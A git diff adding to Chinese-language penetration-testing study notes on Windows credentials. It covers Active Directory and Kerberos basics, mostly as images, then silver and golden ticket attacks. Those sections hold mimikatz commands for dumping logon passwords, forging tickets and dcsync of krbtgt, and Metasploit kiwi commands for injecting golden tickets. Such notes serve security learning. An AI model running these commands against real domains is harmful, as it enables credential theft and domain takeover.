@@ -1,5 +1,79 @@
 # Windows凭证
 
+
+
+## 基础知识
+
+
+
+### AD(Active Directory，活动目录)
+
+活动目录(AD)以树状的数据结构来组成网络服务的信息，在简单的网络环境中（例如小公司），通常网域都只有一个，在中型或大型的网络中，网域可能会有很多个，或是和其他公司或组织的AD相互链接
+
+![](https://raw.githubusercontent.com/Explorersss/photo/master/20201009215930.png)
+
+### Kerbroes(地狱三头犬)
+
+
+
+![](https://raw.githubusercontent.com/Explorersss/photo/master/20201009220224.png)
+
+![image-20201009220751234](C:\Users\11267\AppData\Roaming\Typora\typora-user-images\image-20201009220751234.png)
+
+#### KDC/DC(Key Distribution Center)
+
+##### AS(Authentication Service)
+
+为client生成TGT的服务
+
+##### TGS(Ticket Granting Service)
+
+为client生成某个服务的ticket
+
+#### AD(Account Database)
+
+存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT
+
+### 域认证流程
+
+![](https://raw.githubusercontent.com/Explorersss/photo/master/20201009222147.png)
+
+
+
+
+
+![image-20201011142151698](https://raw.githubusercontent.com/Explorersss/photo/master/20201011142151.png)
+
+
+
+![image-20201011142247651](https://raw.githubusercontent.com/Explorersss/photo/master/20201011142247.png)
+
+
+
+![image-20201011142332901](https://raw.githubusercontent.com/Explorersss/photo/master/20201011142333.png)
+
+
+
+![image-20201011142650639](https://raw.githubusercontent.com/Explorersss/photo/master/20201011142650.png)
+
+
+
+![image-20201011142832621](https://raw.githubusercontent.com/Explorersss/photo/master/20201011142832.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ## 获取明文身份凭证
 
 ### LSA Secrets
@@ -229,3 +303,103 @@ https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1
 #### 获取NTDS.dit文章
 
 https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E8%8E%B7%E5%BE%97%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTDS.dit%E6%96%87%E4%BB%B6/
+
+
+
+## PTT
+
+### 白银票据（Silver Ticket）
+
+
+
+#### 默认服务
+
+![image-20201011143914853](https://raw.githubusercontent.com/Explorersss/photo/master/20201011143914.png)
+
+
+
+
+
+#### 原理
+
+![image-20201011143020800](https://raw.githubusercontent.com/Explorersss/photo/master/20201011143020.png)
+
+
+
+
+
+#### 利用
+
+```
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > pass.txt#导出票据
+mimikate "kerberos::golden /domain:<域名> /sid:<域SID> /target:<目标服务器主机名> /service:<服务类型> /rc4:<NTLM Hash> /user:<用户名> /ptt" exit # 伪造票据
+
+```
+
+
+
+
+
+#### 防御
+
+![image-20201011144015509](https://raw.githubusercontent.com/Explorersss/photo/master/20201011144015.png)
+
+
+
+### 黄金票据（GoldenTickets）
+
+![image-20201011144205810](https://raw.githubusercontent.com/Explorersss/photo/master/20201011144205.png)
+
+#### 利用
+
+msfwiki
+
+![image-20201011144256618](https://raw.githubusercontent.com/Explorersss/photo/master/20201011144256.png)
+
+
+
+
+
+```
+#msfwiki
+load kiwi
+golden_ticket_create -d payloads.online -k <ker> -s <SSID> -u <USER> -t /path/to/save#创建票据
+kerberos_ticket_use /tmp/krbtgt.ticket# 注入票据
+kerberos_ticket_list # 列出票据
+
+
+```
+
+
+
+mimikatz:
+
+```
+mimikatz "kerberos::golden /domain:<域名> /sid ... /rc4 ... /user ... /ptt"
+mimikatz log "lsadump::dcsync /domain:scanf.com /user:krbtgt"
+```
+
+
+
+## Windows Access Token
+
+![image-20201011154101696](https://raw.githubusercontent.com/Explorersss/photo/master/20201011154101.png)
+
+![image-20201011154205413](https://raw.githubusercontent.com/Explorersss/photo/master/20201011154205.png)
+
+![image-20201011154317801](https://raw.githubusercontent.com/Explorersss/photo/master/20201011154317.png)
+
+![image-20201011154325811](https://raw.githubusercontent.com/Explorersss/photo/master/20201011154325.png)
+
+
+
+![image-20201011154404049](https://raw.githubusercontent.com/Explorersss/photo/master/20201011154404.png)
+
+
+
+
+
+## 教程
+
+https://www.bilibili.com/video/BV1S4411q7Cw
+
